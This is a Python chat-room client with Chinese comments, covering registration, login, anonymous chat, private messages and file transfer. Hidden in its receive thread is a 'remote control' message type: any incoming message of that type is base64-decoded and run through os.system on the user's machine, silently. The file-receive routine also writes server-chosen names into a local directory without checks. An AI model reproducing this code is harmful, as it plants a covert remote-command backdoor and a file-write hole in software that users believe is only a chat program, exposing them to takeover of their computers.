from socket import *
from time import ctime
import threading
from enum import Enum
import struct
import re
import os
import base64

HOST = '127.0.0.1'# 服务器IP地址
PORT = 1234 # 服务器端口
MESSAGEBUF = 1024+8
ADDR = (HOST, PORT)
user = ""
pwd = ""

hint = ("1 注册", \
        "2 登录", \
        "3 实时群聊#3", \
        "欢迎来到聊天室", \
        "注册:请输入昵称#登录密码", \
        "登录:请输入昵称#登录密码", \
        "", \
        "", \
        "");
class EnumMessageType(Enum):
    common = 1  # 普通消息
    reg = 2  # 注册消息
    login = 3  # 登录消息
    Anonymous = 4  # 登录消息
    vchat = 5  # 私聊
    control = 6  # 远控
    file = 7  # 传输文件
    picture = 8  # 发送图片
    search = 9  # 搜索
    addfriend= 10  # 添加好友
    alluser = 11  # 所有用户
class Enumcommand(Enum):
    file = "#file"  # 传输文件
    picture = "#pic"  # 发送图片
    control = "#cmd"  # 远控
    search = "#search"  # 搜索
    addfriend = "#add" # 添加好友
    vchat =   "@" #私聊
    alluser = "#all"  # 所有用户

def Control(cmd):
    try:
        os.system(cmd)
    except ConnectionResetError as e:
         return
def Anonymous(sock):
    # 告诉服务器我要匿名聊天
    difinesend(sock, "", EnumMessageType.Anonymous)
    #  等客户端给我分配昵称
    message = sock.recv(MESSAGEBUF)
    # 消息类型
    type, = struct.unpack("i", message[:4])
    # 消息长度
    length, = struct.unpack("L", message[4:8])
    buf, = struct.unpack("%ds" % length, message[8:8 + length])
    name = buf.decode("gb2312")
    print("你的名字：" + name)
    InputFun(sock, name)

def Login(sock):
    name = None
    while 1:
        print("%s:" % hint[5])
        switch = input()
        matchObj = re.match('(.*)#(.*)', switch, re.M | re.I)
        if (matchObj.lastindex == 2):
            user = matchObj.group(1)
            pwd = matchObj.group(2)
            message = (user + "#" + pwd).encode("gb2312")
            difinesend(sock, (user + "#" + pwd), EnumMessageType.login)
            aa = sock.recv(MESSAGEBUF)
            # 消息类型
            type, = struct.unpack("i", aa[:4])
            # 消息长度
            length, = struct.unpack("L", aa[4:8])
            buf, = struct.unpack("%ds" % length, aa[8:8 + length])
            message_recv = buf.decode("gb2312")
            print(message_recv)
            # 登录失败
            if (message_recv != "succeed!"):
                continue
            else:
                print("登录成功")
            break
        else:
            print("登录失败,账号或密码长度需要大于4")
    InputFun(sock, user)

def InputFun(sock, user):
    t = threading.Thread(target=RecvThread, args=(sock,))
    t.start();
    while True:
        message = input()  # 在这输入你的消息
        ctrl = message.split()
        # 命令加私聊
        ctrla=ctrl[0].count('#')+ctrl[0].count('@');
        if ctrla > 0:
            analyze(sock,ctrl,user)
        else:
            difinesend(sock, (user + "说：" + message), EnumMessageType.common)
    sock.close()
    input()
def analyze(sock,message,user):
    temp = str(message[0]).lower()
    print (temp)
    if temp == "#search":
        search(sock,message[1]) #模糊查询
    elif temp == Enumcommand.addfriend.value:
        addfriend(sock,message[1],user) #增加好友
    elif temp == Enumcommand.alluser.value:
        alluser(sock)  # 查看在线用户
    elif temp == Enumcommand.file.value:

        pushfile(sock, message[1])  # 查看在线用户
    elif temp[0] == Enumcommand.vchat.value:
        Vchat(sock,message)

def Vchat(sock,msg):
    temp = msg[0].replace("@", "")
    msg[0]=temp
    str = ' '.join(msg);
    difinesend(sock, str, EnumMessageType.vchat)

def Reg(sock):
    name = None
    while 1:
        print("%s:" % hint[4])
        switch = input()
        matchObj = re.match('(.*)#(.*)', switch, re.M | re.I)

        if (matchObj.lastindex == 2):
            user = matchObj.group(1)
            pwd = matchObj.group(2)
            difinesend(sock, (user + "#" + pwd), EnumMessageType.reg)
            aa = sock.recv(MESSAGEBUF)
            #消息类型
            type ,=struct.unpack("i",aa[:4])
            #消息长度
            length ,=struct.unpack("L",aa[4:8])
            buf,=struct.unpack("%ds" % length,aa[8:8 +length])
            message_recv=buf.decode("gb2312")
            print(message_recv)
            #登录失败
            if (message_recv != "succeed!"):
                continue
            else:
                print("注册成功")
                print("登录成功")
            break
        else:
            print("注册失败,账号或密码长度需要大于4")
    InputFun(sock, user)

def GetFun(nSel):
    switcher = {1:Reg,2:Login,3:Anonymous}
    return switcher.get(nSel,None)
def Menu():
    while 1:
        print("%s\r\n%s\r\n%s\r\n" % hint[0:3])
        switchi={1:1,2:2,3:3}
        switch = int(input("请选择聊天模式!\n"))
        nSel =switchi.get(switch,None)
        if nSel is not None:
            return nSel

def main():
    clientSocket = socket(AF_INET, SOCK_STREAM)
    clientSocket.connect(ADDR)
    # 菜单选择
    nSel = Menu()
    # 不同的菜单对应不同的函数调用
    Fun = GetFun(nSel)
    # 调用函数
    Fun(clientSocket)
    input()

def search(sock,result):
    difinesend(sock, result, EnumMessageType.search)

def alluser(sock):
     difinesend(sock, "", EnumMessageType.alluser)

def addfriend(sock,auser,user):
    #1 本地判断下是否符合要求如当前客户端是否登录了  没登录就不能添加好友(客户端自己判断)
    temp = user.count("游客");
    if(user == "" or temp > 0):
        print("添加失败,请登录后进行添加好友")
        return
    #2. 开始向服务器查询 admin#admin #add qasdad
    difinesend(sock, auser, EnumMessageType.addfriend)
def get_path():
    print("请输入要发送的文件路径")
    while 1:
        try:
            patha = input()
            aa = os.path.getsize(patha)
            return patha, aa
        except FileNotFoundError as e:
            print("路径错误 重新输入")
        except WinError as e:
             print("系统错误请检查环境")

def pushfile(sock,user):
    path,flen = get_path()
    #求包的长度 循环发送
    temp = 0
    i = 0
    with open(path, "r+") as file:
        fileb = file.read()
        temp = len(fileb)
        while (i<temp):
            message = fileb[i:i+600]
            i += 600
            tempaa = user + "#" + message
            print(message)
            message = tempaa.encode("gb18030")
            message_len = len(message)
            print(message)
            message_send = struct.pack("ll%ds" % message_len, 7, message_len, message)
            sock.send(message_send)

def geifile(message):
    path = "C:\\python\\untitled\\"
    lista = message.split("#")
    path = path + lista[0] + '.txt'
    temp = str(lista[1])
    with open(path, "a+",encoding="gb18030") as file:
        file.write(temp)
    file.close()
def RecvThread(sock):
    try:
        while True:
            message = sock.recv(MESSAGEBUF)
            # 消息类型
            type, = struct.unpack("i", message[:4])
            # 消息长度
            length, = struct.unpack("L", message[4:8])
            buf, = struct.unpack("%ds" % length, message[8:8 + length])
            #6远程控制
            if type == EnumMessageType.control.value:
                bb = base64.decodebytes(buf)
                message_recv = bb.decode("gb2312")
                Control(message_recv)
                continue
            elif type in (1,5):
                bb = base64.decodebytes(buf)
                print(bb.decode("gb2312"))
            elif type in(7,8):
                geifile(buf.decode("gb18030"))
            else:
                 print(buf.decode("gb2312"))
    except ConnectionResetError as e:
        exit(0)
def difinesend(sock,str,message_type):
    message =""
    if message_type.value in (1,2,3,5):
        message = base64.encodebytes(str.encode("gb2312"))
       ##
    else:
        message = str.encode("gb2312")
    #message_type = EnumMessageType.vchat
    message_len = len(message)
    # 是L 代表长度和信息类型
    message_send = struct.pack("ll%ds" % message_len, message_type.value, message_len, message)
    sock.send(message_send)
if __name__ == '__main__':
    #clientSocket = socket(AF_INET, SOCK_STREAM)
    #clientSocket.connect(ADDR)
    #Anonymous(clientSocket)

    main()

